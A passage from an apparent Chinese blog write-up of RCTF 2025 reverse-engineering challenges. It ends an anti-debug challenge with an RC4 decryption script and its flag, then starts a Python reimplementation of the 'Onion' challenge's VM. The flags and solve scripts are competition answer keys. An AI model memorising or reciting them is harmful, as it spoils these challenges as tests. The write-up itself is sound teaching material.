</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>n8</span> <span class=o>+</span> <span class=n>dword_A8440C</span><span class=p>)</span> <span class=o>=</span> <span class=sc>&#39;o&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>所以调试起来获得的密钥是错误的，正确的密钥是flag:{ThisflagIsGoods}，然后注意下长度是0x80，后面全空</p><p>exp如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>  <span class=mi>15</span><span class=p>,</span> <span class=mi>26</span><span class=p>,</span> <span class=o>-</span><span class=mi>118</span><span class=p>,</span> <span class=mi>90</span><span class=p>,</span> <span class=mi>34</span><span class=p>,</span> <span class=o>-</span><span class=mi>85</span><span class=p>,</span> <span class=mi>30</span><span class=p>,</span> <span class=mi>99</span><span class=p>,</span> <span class=mi>25</span><span class=p>,</span> <span class=mi>90</span><span class=p>,</span> <span class=o>-</span><span class=mi>121</span><span class=p>,</span> <span class=o>-</span><span class=mi>14</span><span class=p>,</span> <span class=o>-</span><span class=mi>26</span><span class=p>,</span> <span class=o>-</span><span class=mi>23</span><span class=p>,</span> <span class=o>-</span><span class=mi>41</span><span class=p>,</span> <span class=o>-</span><span class=mi>47</span><span class=p>,</span> <span class=o>-</span><span class=mi>105</span><span class=p>,</span> <span class=o>-</span><span class=mi>7</span><span class=p>,</span> <span class=o>-</span><span class=mi>8</span><span class=p>,</span> <span class=mi>50</span><span class=p>,</span> <span class=mi>91</span><span class=p>,</span> <span class=o>-</span><span class=mi>34</span><span class=p>,</span> <span class=mi>45</span><span class=p>,</span> <span class=o>-</span><span class=mi>42</span><span class=p>,</span> <span class=o>-</span><span class=mi>93</span><span class=p>,</span> <span class=mi>79</span><span class=p>,</span> <span class=mi>126</span><span class=p>,</span> <span class=o>-</span><span class=mi>53</span><span class=p>,</span> <span class=mi>97</span><span class=p>,</span> <span class=o>-</span><span class=mi>78</span><span class=p>,</span> <span class=mi>63</span><span class=p>,</span> <span class=o>-</span><span class=mi>65</span><span class=p>,</span> <span class=o>-</span><span class=mi>73</span><span class=p>,</span> <span class=mi>27</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=o>-</span><span class=mi>124</span><span class=p>,</span> <span class=o>-</span><span class=mi>77</span><span class=p>,</span> <span class=o>-</span><span class=mi>76</span><span class=p>,</span> <span class=o>-</span><span class=mi>34</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>70</span><span class=p>,</span> <span class=mi>123</span><span class=p>,</span> <span class=o>-</span><span class=mi>125</span><span class=p>,</span> <span class=o>-</span><span class=mi>16</span><span class=p>,</span> <span class=o>-</span><span class=mi>60</span><span class=p>,</span> <span class=o>-</span><span class=mi>77</span><span class=p>,</span> <span class=o>-</span><span class=mi>85</span><span class=p>,</span> <span class=mi>123</span><span class=p>,</span> <span class=mi>41</span><span class=p>,</span> <span class=o>-</span><span class=mi>68</span><span class=p>,</span> <span class=mi>31</span><span class=p>,</span> <span class=o>-</span><span class=mi>2</span><span class=p>,</span> <span class=o>-</span><span class=mi>118</span><span class=p>,</span> <span class=mi>121</span><span class=p>,</span> <span class=mi>38</span><span class=p>,</span> <span class=o>-</span><span class=mi>38</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>123</span><span class=p>,</span> <span class=mi>102</span><span class=p>,</span> <span class=mi>125</span><span class=p>,</span> <span class=o>-</span><span class=mi>69</span><span class=p>,</span> <span class=o>-</span><span class=mi>18</span><span class=p>,</span> <span class=mi>15</span><span class=p>,</span> <span class=o>-</span><span class=mi>119</span><span class=p>,</span> <span class=mi>89</span><span class=p>,</span> <span class=o>-</span><span class=mi>44</span><span class=p>,</span> <span class=mi>95</span><span class=p>,</span> <span class=o>-</span><span class=mi>84</span><span class=p>,</span> <span class=mi>24</span><span class=p>,</span> <span class=o>-</span><span class=mi>82</span><span class=p>,</span> <span class=mi>11</span><span class=p>,</span> <span class=mi>78</span><span class=p>,</span> <span class=o>-</span><span class=mi>16</span><span class=p>,</span> <span class=o>-</span><span class=mi>73</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>92</span><span class=p>,</span> <span class=o>-</span><span class=mi>127</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=o>-</span><span class=mi>97</span><span class=p>,</span> <span class=o>-</span><span class=mi>92</span><span class=p>,</span> <span class=mi>28</span><span class=p>,</span> <span class=mi>93</span><span class=p>,</span> <span class=o>-</span><span class=mi>96</span><span class=p>,</span> <span class=o>-</span><span class=mi>71</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=o>-</span><span class=mi>110</span><span class=p>,</span> <span class=mi>92</span><span class=p>,</span> <span class=o>-</span><span class=mi>118</span><span class=p>,</span> <span class=mi>83</span><span class=p>,</span> <span class=o>-</span><span class=mi>13</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>9</span><span class=p>,</span> <span class=o>-</span><span class=mi>89</span><span class=p>,</span> <span class=o>-</span><span class=mi>35</span><span class=p>,</span> <span class=mi>46</span><span class=p>,</span> <span class=o>-</span><span class=mi>26</span><span class=p>,</span> <span class=o>-</span><span class=mi>19</span><span class=p>,</span> <span class=mi>15</span><span class=p>,</span> <span class=mi>119</span><span class=p>,</span> <span class=mi>44</span><span class=p>,</span> <span class=mi>74</span><span class=p>,</span> <span class=mi>34</span><span class=p>,</span> <span class=o>-</span><span class=mi>15</span><span class=p>,</span> <span class=mi>54</span><span class=p>,</span> <span class=mi>79</span><span class=p>,</span> <span class=o>-</span><span class=mi>89</span><span class=p>,</span> <span class=o>-</span><span class=mi>18</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=o>-</span><span class=mi>42</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>115</span><span class=p>,</span> <span class=mi>85</span><span class=p>,</span> <span class=mi>94</span><span class=p>,</span> <span class=mi>62</span><span class=p>,</span> <span class=o>-</span><span class=mi>109</span><span class=p>,</span> <span class=o>-</span><span class=mi>92</span><span class=p>,</span> <span class=mi>52</span><span class=p>,</span> <span class=mi>41</span><span class=p>,</span> <span class=mi>103</span><span class=p>,</span> <span class=o>-</span><span class=mi>4</span><span class=p>,</span> <span class=mi>35</span><span class=p>,</span> <span class=mi>121</span><span class=p>,</span> <span class=mi>25</span><span class=p>,</span> <span class=o>-</span><span class=mi>40</span><span class=p>,</span> <span class=o>-</span><span class=mi>55</span><span class=p>,</span> <span class=mi>43</span><span class=p>,</span> <span class=o>-</span><span class=mi>49</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=p>[(</span><span class=n>x</span> <span class=o>+</span> <span class=mi>256</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>cipher</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;flag:</span><span class=si>{ThisflagIsGoods}</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>+</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=p>(</span><span class=mi>128</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;flag:</span><span class=si>{ThisflagIsGoods}</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rc4_init</span><span class=p>(</span><span class=n>key_bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>S</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>256</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>key_len</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>key_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>256</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>j</span> <span class=o>=</span> <span class=p>(</span><span class=n>j</span> <span class=o>+</span> <span class=n>S</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=n>key_bytes</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=n>key_len</span><span class=p>])</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>        <span class=n>S</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>S</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>S</span><span class=p>[</span><span class=n>j</span><span class=p>],</span> <span class=n>S</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>S</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rc4_crypt</span><span class=p>(</span><span class=n>S</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>idx</span><span class=p>,</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>=</span> <span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>        <span class=n>Si</span> <span class=o>=</span> <span class=n>S</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>j</span> <span class=o>=</span> <span class=p>(</span><span class=n>j</span> <span class=o>+</span> <span class=n>Si</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>        <span class=n>Sj</span> <span class=o>=</span> <span class=n>S</span><span class=p>[</span><span class=n>j</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>S</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>S</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>Sj</span><span class=p>,</span> <span class=n>Si</span>
</span></span><span class=line><span class=cl>        <span class=n>K</span> <span class=o>=</span> <span class=n>S</span><span class=p>[(</span><span class=n>Si</span> <span class=o>+</span> <span class=n>Sj</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>b</span> <span class=o>^</span> <span class=n>K</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x80</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>S</span> <span class=o>=</span> <span class=n>rc4_init</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plain</span> <span class=o>=</span> <span class=n>rc4_crypt</span><span class=p>(</span><span class=n>S</span><span class=p>,</span> <span class=n>cipher</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>plain</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;decoded:&#34;</span><span class=p>,</span> <span class=n>plain</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>解得flag：RCTF{AntiDbg_Reversing_2025_v2.0_Ch4llenge}</p><h2 id=onion>Onion</h2><p>非常复杂的vm，题目要求输入50行数字，最开始尝试左移、右移、异或这些常见运算指令下条件断点试图打印，结果发现看不出规律且调用非常多，无奈去同构VM，不得不说GPT5同构能力非常强，vm代码喂给它给了份python实现，稍微修改下加入log，对比动态调试的数据对的上就可以用了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span><span class=lnt>343
</span><span class=lnt>344
</span><span class=lnt>345
</span><span class=lnt>346
</span><span class=lnt>347
</span><span class=lnt>348
</span><span class=lnt>349
</span><span class=lnt>350
</span><span class=lnt>351
</span><span class=lnt>352
</span><span class=lnt>353
</span><span class=lnt>354
</span><span class=lnt>355
</span><span class=lnt>356
</span><span class=lnt>357
</span><span class=lnt>358
</span><span class=lnt>359
</span><span class=lnt>360
</span><span class=lnt>361
</span><span class=lnt>362
</span><span class=lnt>363
</span><span class=lnt>364
</span><span class=lnt>365
</span><span class=lnt>366
</span><span class=lnt>367
</span><span class=lnt>368
</span><span class=lnt>369
</span><span class=lnt>370
</span><span class=lnt>371
</span><span class=lnt>372
</span><span class=lnt>373
</span><span class=lnt>374
</span><span class=lnt>375
</span><span class=lnt>376
</span><span class=lnt>377
</span><span class=lnt>378
</span><span class=lnt>379
</span><span class=lnt>380
</span><span class=lnt>381
</span><span class=lnt>382
</span><span class=lnt>383
</span><span class=lnt>384
</span><span class=lnt>385
</span><span class=lnt>386
</span><span class=lnt>387
</span><span class=lnt>388
</span><span class=lnt>389
</span><span class=lnt>390
</span><span class=lnt>391
</span><span class=lnt>392
</span><span class=lnt>393
</span><span class=lnt>394
</span><span class=lnt>395
</span><span class=lnt>396
</span><span class=lnt>397
</span><span class=lnt>398
</span><span class=lnt>399
</span><span class=lnt>400
</span><span class=lnt>401
</span><span class=lnt>402
</span><span class=lnt>403
</span><span class=lnt>404
</span><span class=lnt>405
</span><span class=lnt>406
</span><span class=lnt>407
</span><span class=lnt>408
</span><span class=lnt>409
</span><span class=lnt>410
</span><span class=lnt>411
</span><span class=lnt>412
</span><span class=lnt>413
</span><span class=lnt>414
</span><span class=lnt>415
</span><span class=lnt>416
</span><span class=lnt>417
</span><span class=lnt>418
</span><span class=lnt>419
</span><span class=lnt>420
</span><span class=lnt>421
</span><span class=lnt>422
</span><span class=lnt>423
</span><span class=lnt>424
</span><span class=lnt>425
</span><span class=lnt>426
</span><span class=lnt>427
</span><span class=lnt>428
</span><span class=lnt>429
</span><span class=lnt>430
</span><span class=lnt>431
</span><span class=lnt>432
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>MEM_SIZE</span> <span class=o>=</span> <span class=mh>0x10000</span>
</span></span><span class=line><span class=cl><span class=n>DATA_QWORD_BASE</span> <span class=o>=</span> <span class=mi>7168</span>  <span class=c1># in qwords</span>
</span></span><span class=line><span class=cl><span class=n>DATA_BASE</span> <span class=o>=</span> <span class=n>DATA_QWORD_BASE</span> <span class=o>*</span> <span class=mi>8</span>  <span class=c1># 0xE000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>u8</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>  <span class=k>return</span> <span class=n>x</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>u16</span><span class=p>(</span><span class=n>x</span><span class=p>):</span> <span class=k>return</span> <span class=n>x</span> <span class=o>&amp;</span> <span class=mh>0xFFFF</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>u32</span><span class=p>(</span><span class=n>x</span><span class=p>):</span> <span class=k>return</span> <span class=n>x</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>u64</span><span class=p>(</span><span class=n>x</span><span class=p>):</span> <span class=k>return</span> <span class=n>x</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>VM</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>vmcode</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>input_ints</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>debug_after_n</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>mem</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=n>MEM_SIZE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>vmcode</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>DATA_BASE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;vmcode too large&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[:</span><span class=nb>len</span><span class=p>(</span><span class=n>vmcode</span><span class=p>)]</span> <span class=o>=</span> <span class=n>vmcode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># VM 状态</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>regs</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=mi>8</span>          <span class=c1># s[0..7]</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=mi>0</span>                  <span class=c1># 低 16 位：指令指针</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>=</span> <span class=mh>0xFFFF</span>             <span class=c1># 高 16 位：数据/栈指针</span>
